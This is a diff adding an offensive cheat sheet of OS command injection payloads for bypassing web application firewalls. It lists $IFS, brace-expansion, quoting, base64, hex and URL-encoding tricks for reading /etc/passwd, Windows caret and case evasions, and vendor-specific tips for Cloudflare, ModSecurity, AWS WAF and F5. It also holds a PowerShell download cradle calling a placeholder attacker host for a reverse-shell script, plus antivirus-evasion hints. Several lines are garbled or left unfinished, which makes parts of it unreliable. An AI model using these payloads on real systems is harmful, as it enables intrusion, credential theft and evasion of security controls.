@@ -1,0 +1,93 @@
+# OS COMMAND INJECTION WAF BYPASS - 2026
+# Order: 1) find blocked char/keyword (fuzz 1 char at a time) 2) mutate cmd 3) re-encode.
+# Golden trick: most WAFs map "optional whitespace" to a regex, miss $IFS / tabs / quotes instead.
+
+## 1) WHITESPACE REPLACEMENT ($IFS family - bash)
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+cat${IFS%%??}etc/passwd
+cat${IFS:0:1}/etc/passwd        # ${V:pos:len} - takes first char of IFS (space)
+cat$'\x20'/etc/passwd           # $'' ANSI-C quoting
+cat$'\t'/etc/passwd
+cat%09/etc/passwd               # encode tab
+cat%0a/etc/passwd               # encode newline (some WAFs let newline through)
+cat+/etc/passwd                 # '+' accepted in query strings
+cat\t/etc/passwd                # literal tab in body
+${PATH:0:1}bin${PATH:0:1}cat    # / via slicing
+
+## 2) BRACE EXPANSION (no whitespace at all)
+{cat,/etc/passwd}
+{id,-u}
+{ls,-la,/root}
+
+## 3) STRING CONSTRUCTION / OBFUSCATION (blocks keyword 'cat','ls','id')
+cat /etc/passwd   ->   coalesce: c'a't /etc/passwd   c"a"t /etc/passwd   c\a\t /etc/passwd   ca$@t /etc/passwd
+cat /etc/passwd   ->   /???/c?t /etc/passwd          /???/c?t /?tc/?as?wd
+cat /etc/passwd   ->   $(echo L2V0Yy9wYXNzd2Q=|base64 -d | xargs cat)                          # base64 cmd
+cat /etc/passwd   ->   cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd        # tr-shift for '/'
+cat /etc/passwd   ->   cat $(echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")            # hex escape
+cat /etc/passwd   ->   cat $(xxd -r -p <<< 2f6574632f706173737764)                              # xxd
+cat /etc/passwd   ->   cat $(echo -n /etc/passwd | rev)                                         # reverse chars
+cat /etc/passwd   ->   $(rod0l:???) console literal? skip
+cat /etc/passwd   ->   c$BAdir at? over-engineering - stop.
+
+## 4) COMMAND ALIAS / VARIABLE TRICKS (bash)
+# use $() to build the command inside env vars:
+id=whoami;$id
+wh=who;ami;$wh$@
+a=m;b=y;c=s;d=ql;$a$b$c$d /etc/passwd
+$(/bin/bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)")
+sh -c $'cat\x20/etc/passwd'          # \x20 is space for $'..'
+printf '/etc/passwd' | xargs cat
+# spawn via mailcap/pager: whatis; pager; apt:
+pager;less /etc/passwd               # if in base64-needed 'less' present
+
+## 5) NEWLINE / CARRIAGE RETURN (classic node/php splitters)
+%0acat%20/etc/passwd
+%0Acat /etc/passwd%0a
+%0d%0a id %0d%0a
+\ncat /etc/passwd\n
+;printf '\ncat /etc/passwd\n' | sh
+%300%261%20 -> junk variants fix later; keep the ones above.
+
+## 6) ENCODING LAYERS (URL / double-URL / HTML / unicode / null-byte)
+%63%61%74 /etc/passwd           # hex-encode the keyword
+%2563%2561%2574 /etc/passwd      # double encode
+c%61t /etc/passwd                # partial hex
+cat%20/etc/passwd
+%2Fetc%2Fpasswd
+cat /etc/passwd%00              # null-terminate (PHP/C string)
+# WSGI/node often decode twice -> %2e%2e / unicode '%u002f' on IIS
+
+## 7) CASE / MIXED (only for engines doing case-sensitive match; on linux cmd names are lowercase)
+CaT /etc/passwd                  # won't match - linux needs exact case; skip linux-cmd use
+# USEFUL instead on windows-only changes:  WhOaMi (cmd is case-insensitive!) -> works great
+WhOaMi
+|  WhOaMi
+;  WhOaMi
+"WhOaMi"   ^WhOaMi   %WhOaMi%
+
+## 8) WINDOWS-SPECIFIC EVASION (cmd / powershell)
+pw;whoami                          # pw is alias-cousin cmd split? - use punctuation split:
+who^ami                            # caret eats the char, yields whoami
+whoa"mi                            # quotes split for matching
+%COMSPEC% /c whoami
+%SystemRoot%\System32\whoami.exe
+pOwErShElL.exe -c whoami           # PS is case-insensitive
+powershell -enc <BASE64 powershell payload>    # fully encoded - classic reaper
+# PS encoded payload builder (attacker box):
+#   $c='IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER-IP/rev.ps1")'
+#   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($c))
+certutil -decode  (drop base64 file)
+start /b "" "c:\path"              # alt exec
+rundll32 javascript:"\..\mshtml,RunHTMLApplication";eval("...")   # AV evasive drop
+
+## 9) WAF-SPECIFIC TIPS (2026 quick-hits)
+- Cloudflare managed rules: tab (%09) + newline (%0a) often slip; use ${IFS} on bash apps.
+- ModSecurity + CRS: blocks ; | { } in order; try `$({})`/unicode-equivalent + base64 -d via stdin pipe:
+   printf 'cat /etc/passwd\n' | sh        # avoids ) and ;
+- AWS WAF / Akamai: integer-and-counter bypass; craft `1'+`1`+'` executes nothing; test char gates SEPARATELY.
+- F5/Trafficshield .NET: null byte %00 + ^^ caret both old, but retest - still seen on legacy.
+- The "();cat)" long padding trick: terminate early with a comment for node:
+   ;echo PWNED#
+# AV (not WAF): use certutil/base64 patterns above; avoid netcat/telnet signatures names.
